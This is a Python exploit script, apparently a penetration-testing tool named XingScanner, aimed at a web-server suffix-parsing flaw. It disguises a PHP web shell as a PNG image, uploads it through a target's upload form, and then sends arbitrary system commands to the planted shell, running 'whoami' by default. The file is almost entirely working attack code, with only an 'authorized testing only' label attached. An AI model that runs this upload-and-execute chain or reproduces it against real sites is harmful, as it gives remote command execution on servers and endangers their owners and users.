import random
import string
from urllib.parse import urlparse
import requests
import argparse
import sys
from colorama import Fore, Style


def create_parser():
    """创建并配置参数解析器"""

    parser = argparse.ArgumentParser(
        prog="XingScanner",
        description="Apache 多后缀解析漏洞检测工具",
        epilog=f"{Fore.GREEN}Created by Mahua | 仅限授权测试使用{Style.RESET_ALL}",
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False
    )

    # 必选参数组
    required = parser.add_argument_group(f"{Fore.YELLOW}必选参数{Style.RESET_ALL}")
    required.add_argument("-t", "--target",
                          required=True,
                          help=f"目标URL (示例: {Fore.BLUE}http://target.com/upload.php{Style.RESET_ALL})")

    # 可选参数组
    optional = parser.add_argument_group(f"{Fore.CYAN}可选参数{Style.RESET_ALL}")
    optional.add_argument("-c", "--command",
                          default="whoami",
                          help=f"要执行的系统命令 (默认: {Fore.GREEN}%(default)s{Style.RESET_ALL})")
    optional.add_argument("-o", "--output",
                          type=argparse.FileType('w'),
                          help="结果输出文件路径")
    optional.add_argument("-v", "--verbose",
                          action="count",
                          default=0,
                          help="详细模式 (-v 详细信息, -vv 调试输出)")
    optional.add_argument("-h", "--help",
                          action="store_true",
                          help="显示帮助信息")

    return parser


def precheck_arguments(parser):
    """预处理帮助请求和空参数场景"""

    # 显式帮助请求优先
    if any(arg in sys.argv for arg in ('-h', '--help')):
        parser.print_help()
        sys.exit(0)

    # 空参数场景处理
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)


def check_vulnerability(url):
    """Nginx配置不当 解析漏洞"""

    arg_url = urlparse(url)
    base_url = f'{arg_url.scheme}://{arg_url.netloc}/'
    target_url = f'{base_url}{arg_url.path}'
    rand_str = ''.join(random.choices('qwertyuiopasdfghjklzxcvbnm', k=6))
    webshell_name = f'{rand_str}.png'
    # 使用二进制模式构造文件内容
    png_header = bytes.fromhex('89504E470D0A1A0A')  # PNG文件头
    php_code = b'<?php echo system($_POST["cmd"]); ?>'
    # 传输的内容为图片，不是文本数据，应传原始二进制（手动编码）的字节流； 这样数据在传输过程终究不会被自动编码
    # 文本数据（字符流）也会以字节流传输，不过文本没有特殊结构，映射关系很简单，所以衍生出了字符流传输

    # 合并为二进制内容（确保PNG结构合法，可添加简单IHDR块）
    webshell_content = (
            png_header +
            # 添加一个最小的IHDR块（示例，需根据实际调整）
            b'\x00\x00\x00\x0D' +  # IHDR块长度（13字节）
            b'IHDR' +  # 块标识
            b'\x00\x00\x00\x01' +  # 宽度（1像素）
            b'\x00\x00\x00\x01' +  # 高度（1像素）
            b'\x08\x02\x00\x00\x00' +  # 位深、颜色类型等（示例值）
            b'\x00\x00\x00\x00' +  # CRC校验（示例，实际需计算）
            php_code  # 插入PHP代码
    )

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Host': f'{arg_url.netloc}',
        'Referer': f'{base_url}'
    }

    files = {
        'file_upload': (webshell_name, webshell_content, 'image/png')
    }

    response = requests.post(target_url, headers=headers, files=files, verify=False)
    if response.status_code == 200:
        print(response.text)
        str = response.text
        a_list = str.split(sep='/')
        a_list.reverse()
        shell_path = a_list[0]
        webshell_path = f'{base_url}uploadfiles/{shell_path}/.php'
        print(webshell_path)
        return webshell_path
    else:
        print(response.status_code)


def execute_command(webshell_path, command):

    data = {
        'cmd': command,
    }

    response = requests.post(webshell_path, data=data, verify=False)
    if response.status_code == 200:
        print(f'{Fore.GREEN}{response.text}{Style.RESET_ALL}')
        print('\n')
        print(f'{Fore.YELLOW}成功执行命令"{command}",可使用"-c"参数指定执行命令{Style.RESET_ALL}')
        print('\n')
    else:
        print(response.status_code)


def main():
    parser = create_parser()
    precheck_arguments(parser)
    args = parser.parse_args()
    webshell_path = check_vulnerability(args.target)
    execute_command(webshell_path, args.command)


if __name__ == '__main__':
    main()
